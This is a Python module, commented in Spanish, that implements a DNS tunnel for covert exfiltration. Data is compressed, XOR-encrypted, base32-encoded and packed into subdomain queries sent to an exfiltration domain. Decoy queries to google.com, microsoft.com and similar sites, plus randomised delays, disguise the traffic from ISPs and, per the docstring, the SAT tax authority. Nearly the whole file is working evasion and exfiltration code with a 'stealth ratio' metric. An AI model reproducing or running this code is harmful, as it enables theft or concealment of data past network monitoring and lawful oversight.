from pathlib import Path

"""
DNS Tunneling - Comunicación de Sombras
Exfiltra datos disfrazados como consultas DNS
"""

from typing import Any, Dict, List, Optional
import base64
import logging
import random
import socket
import struct
import sys
import threading
import time
import zlib

logger = logging.getLogger(__name__)

class DNSTunnel:
    """
    Sistema de comunicación vía túnel DNS.
    
    Los datos van disfrazados de consultas de nombres de dominio.
    Para el ISP/SAT: "Solo pregunta IPs de google.com"
    Realidad: Los subdominios llevan datos cifrados de Serie B.
    
    Ejemplo:
    - Consulta: aG9sYQ.encoded.ghost.example.com
    - El subdominio "aG9sYQ" = base64 de los datos
    """
    
    # Dominios señuelo (parecen tráfico normal)
    COVER_DOMAINS = [
        'google.com',
        'microsoft.com',
        'apple.com',
        'amazon.com',
        'facebook.com',
        'cloudflare.com',
        'akamai.com',
        'fastly.net',
    ]
    
    # Tu dominio real de exfiltración (configurar)
    EXFIL_DOMAIN = 'ghost-sync.example.com'
    
    # Tamaño máximo por consulta DNS (63 chars por label, ~250 total)
    MAX_CHUNK_SIZE = 180  # Conservador para evitar problemas
    
    def __init__(self, secret_key: bytes = None, exfil_domain: str = None):
        self.secret_key = secret_key or self._generate_key()
        self.exfil_domain = exfil_domain or self.EXFIL_DOMAIN
        self.dns_server = '8.8.8.8'  # Fallback a Google DNS
        self.stealth_ratio = 0.0
        self.total_queries = 0
        self.data_queries = 0
    
    def _generate_key(self) -> bytes:
        """Genera clave de cifrado."""
        return bytes(random.getrandbits(8) for _ in range(32))
    
    def encode_data_as_dns(self, data: bytes) -> List[str]:
        """
        Codifica datos como consultas DNS válidas.
        
        Args:
            data: Datos a exfiltrar
        
        Returns:
            Lista de nombres de dominio que contienen los datos
        """
        # 1. Comprimir
        compressed = zlib.compress(data)
        
        # 2. Cifrar (XOR simple por ahora)
        encrypted = self._xor_encrypt(compressed)
        
        # 3. Base32 (más seguro para DNS que base64)
        encoded = base64.b32encode(encrypted).decode().lower()
        
        # 4. Dividir en chunks de tamaño válido para DNS
        chunks = []
        chunk_id = 0
        
        while encoded:
            # Max 63 chars por label, dejamos espacio para metadata
            chunk = encoded[:50]
            encoded = encoded[50:]
            
            # Formato: <chunk_id>-<data>.<exfil_domain>
            dns_name = f"{chunk_id:02x}-{chunk}.{self.exfil_domain}"
            chunks.append(dns_name)
            chunk_id += 1
        
        return chunks
    
    def decode_dns_response(self, responses: List[str]) -> Optional[bytes]:
        """
        Decodifica datos de respuestas DNS.
        """
        try:
            # Ordenar por chunk_id
            sorted_chunks = sorted(responses, key=lambda x: int(x.split('-')[0], 16))
            
            # Extraer datos de cada chunk
            encoded = ''
            for chunk in sorted_chunks:
                # Extraer parte de datos
                parts = chunk.split('.')[0]  # chunk_id-data
                data_part = parts.split('-', 1)[1] if '-' in parts else parts
                encoded += data_part
            
            # Decodificar
            encrypted = base64.b32decode(encoded.upper())
            compressed = self._xor_encrypt(encrypted)  # XOR es simétrico
            original = zlib.decompress(compressed)
            
            return original
            
        except Exception as e:
            logger.error(f"Error decodificando DNS: {e}")
            return None
    
    def _xor_encrypt(self, data: bytes) -> bytes:
        """Simple XOR encryption with key."""
        key_len = len(self.secret_key)
        return bytes(
            data[i] ^ self.secret_key[i % key_len]
            for i in range(len(data))
        )
    
    def send_via_dns(self, data: bytes, with_cover: bool = True) -> Dict[str, Any]:
        """
        Envía datos a través de consultas DNS.
        
        Args:
            data: Datos a enviar
            with_cover: Si generar tráfico señuelo
        
        Returns:
            Resultado del envío
        """
        # Generar consultas de datos
        dns_queries = self.encode_data_as_dns(data)
        
        results = {
            'success': True,
            'data_queries': len(dns_queries),
            'cover_queries': 0,
            'total_queries': 0
        }
        
        try:
            for query in dns_queries:
                # Enviar consulta real (datos)
                self._send_dns_query(query)
                self.data_queries += 1
                
                if with_cover:
                    # Generar tráfico señuelo para ocultar
                    cover_count = random.randint(3, 8)
                    for _ in range(cover_count):
                        cover_domain = random.choice(self.COVER_DOMAINS)
                        self._send_dns_query(cover_domain)
                        results['cover_queries'] += 1
                
                # Delay aleatorio para parecer tráfico humano
                time.sleep(random.uniform(0.1, 0.5))
            
            results['total_queries'] = results['data_queries'] + results['cover_queries']
            self.total_queries += results['total_queries']
            
            # Calcular ratio de sigilo
            if self.total_queries > 0:
                self.stealth_ratio = (self.data_queries / self.total_queries) * 100
            
            results['stealth_ratio'] = round(self.stealth_ratio, 2)
            
            return results
            
        except Exception as e:
            logger.error(f"Error en DNS tunnel: {e}")
            return {'success': False, 'error': str(e)}
    
    def _send_dns_query(self, domain: str) -> Optional[str]:
        """Envía una consulta DNS real."""
        try:
            # Usar socket UDP directamente para más control
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            
            # Construir paquete DNS
            packet = self._build_dns_packet(domain)
            
            # Enviar al servidor DNS
            sock.sendto(packet, (self.dns_server, 53))
            
            # Recibir respuesta (no nos importa realmente)
            try:
                response, _ = sock.recvfrom(1024)
            except socket.timeout:
                pass
            
            sock.close()
            return domain
            
        except Exception as e:
            logger.debug(f"DNS query failed: {e}")
            return None
    
    def _build_dns_packet(self, domain: str) -> bytes:
        """Construye un paquete DNS válido."""
        # Transaction ID (random)
        transaction_id = struct.pack('>H', random.randint(0, 65535))
        
        # Flags: Standard query
        flags = struct.pack('>H', 0x0100)
        
        # Questions: 1, Answers: 0, Authority: 0, Additional: 0
        counts = struct.pack('>HHHH', 1, 0, 0, 0)
        
        # Question section
        question = b''
        for label in domain.split('.'):
            question += bytes([len(label)]) + label.encode()
        question += b'\x00'  # Null terminator
        
        # Type: A (1), Class: IN (1)
        question += struct.pack('>HH', 1, 1)
        
        return transaction_id + flags + counts + question
    
    def generate_cover_traffic(self, duration_seconds: int = 60):
        """
        Genera tráfico DNS de cobertura por un período.
        
        Hace que el tráfico real sea indistinguible.
        """
        def cover_loop():
            end_time = time.time() + duration_seconds
            
            while time.time() < end_time:
                # Consulta aleatoria a dominio conocido
                domain = random.choice(self.COVER_DOMAINS)
                subdomain = f"www.{domain}" if random.random() > 0.5 else domain
                
                self._send_dns_query(subdomain)
                self.total_queries += 1
                
                # Delay realista
                time.sleep(random.uniform(0.5, 3.0))
        
        thread = threading.Thread(target=cover_loop, daemon=True)
        thread.start()
        
        # SECURITY: No loguear tráfico de cobertura DNS
        pass
    
    def sync_data_covertly(self, sync_data: Dict) -> Dict[str, Any]:
        """
        Sincroniza datos usando el túnel DNS.
        
        Wrapper de alto nivel para sincronización.
        """
        import json

        # Convertir datos a bytes
        data_bytes = json.dumps(sync_data).encode()
        
        # Iniciar tráfico de cobertura
        self.generate_cover_traffic(30)
        
        # Esperar un poco para mezclar
        time.sleep(random.uniform(2, 5))
        
        # Enviar datos reales
        result = self.send_via_dns(data_bytes, with_cover=True)
        
        return result
    
    def get_stealth_metrics(self) -> Dict[str, Any]:
        """
        Obtiene métricas de sigilo del túnel.
        """
        if self.total_queries == 0:
            return {
                'status': 'INACTIVE',
                'data_queries': 0,
                'cover_queries': 0,
                'stealth_ratio': 0
            }
        
        ratio = (self.data_queries / self.total_queries) * 100
        
        if ratio < 10:
            status = 'EXCELLENT'
        elif ratio < 20:
            status = 'GOOD'
        elif ratio < 30:
            status = 'ACCEPTABLE'
        else:
            status = 'EXPOSED'
        
        return {
            'status': status,
            'data_queries': self.data_queries,
            'cover_queries': self.total_queries - self.data_queries,
            'total_queries': self.total_queries,
            'stealth_ratio': round(ratio, 2),
            'recommendation': 'Aumentar tráfico de cobertura' if ratio > 20 else 'Óptimo'
        }

# Función para sincronización de emergencia
def emergency_dns_sync(data: Dict, key: bytes = None):
    """Sincronización de emergencia vía DNS."""
    tunnel = DNSTunnel(key)
    return tunnel.sync_data_covertly(data)
